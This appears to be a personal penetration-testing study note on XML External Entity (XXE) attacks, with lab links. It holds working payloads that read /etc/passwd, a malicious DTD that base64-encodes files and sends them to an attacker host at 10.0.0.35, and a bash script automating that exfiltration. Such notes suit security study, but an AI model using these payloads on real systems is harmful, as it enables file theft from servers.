- **tags:** #top10 #XXE
-----------------------------
# XML External Entity
## Entities
Short answer: fancy word for XML variables.
On an XML document we define *entities* to allow refactoring of variables and reduce repetitive data. This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value, as follows:
There are **three** types of **entities**:
- *Custom*
- *External*
- *Predefined* (`&lt;`, `&gt;`, used to avoid any kind of conflict with the XML tags).
### Custom Entities
Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&email;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser.
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY email "test@gmail.com">]>
<root>
	<name>
		test
	</name>
	<tel>
		123456789
	</tel>
	<email>
		&email;
	</email>
	<password>
		test12345
	</password>
</root>
```
**Note:** Before declaring our entity we are creating beforehand a *DTD* (this concept is explained later on [[XXE#External Entities|External Entities]]) named foo. 
![[XXE1.png]]
### External Entities 
More interestingly, we can *reference* *External* XML *Entities* with the `SYSTEM` keyword, which is followed by the external entity's path. We can either point to a file from the server itself.
```XML
<!DOCTYPE foo [<!ENTITY myFile SYSTEM 'file:///etc/passwd'>]>
```
![[XXE2.png]]
Or we could point it to our very trustworthy server :)
![[XXE4.png]]
### Error Based
If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.
![[XXE7.png]]
![[XXE6.png]]
Baiscally you concatenate the file you want to display (`/flag.php`) with a non existent entity, so an error occurs disclosing the content of the desired document.
### XXE Out-of-Band (BLIND)
Now we are going to make use of an external XML *DTDs* (Document Type Definition). *DTDs* allow the validation of an XML document against a pre-defined document structure. However, we may also use *DTD* to define other custom entries. 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxeoob SYSTEM "http://10.0.0.35/malicious.dtd"> %xxeoob]>
<root>
	<name>
		test
	</name>
	<tel>
		123456789
	</tel>
	<email>
		&email;
	</email>
	<password>
		test12345
	</password>
</root>
```

```XML
<!--malicious.dtd-->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.35:80/?file=%file;'>">
%eval;
%exfil;
```
**Note:** We are using `PHP` [[wrappers]] to *base64* encode the file content and send it on the *GET* url request. Also checkout how the hex representation of *%* (*&#x25;*).
![[XXE5.png]]
### Scripting in Bash
We can try to automate the previous process with a little bit of bash scripting:
```bash
#!/bin/bash

echo -ne "[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.35:80/?file=%file;'>\">
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

sleep 1

PID=$!

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>               
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.0.0.35/malicious.dtd">%xxe;]>
<root><name>test</name><tel>123456789</tel><email>test</email><password>test12345</password></root>' &>/dev/null

kill -9 $PID 
wait $PID 2>/dev/null

results=$(cat response | grep -oP "/?file=\K[^.*\s]+")
echo -e "\n[+] File content:\n"
echo -n $results | base64 -d; echo

rm response malicious.dtd &>/dev/null
```
### Resource Labs:
- [XXE lab](https://github.com/jbarone/xxelab)
- [NodeBlog HTB](https://app.hackthebox.com/machines/430)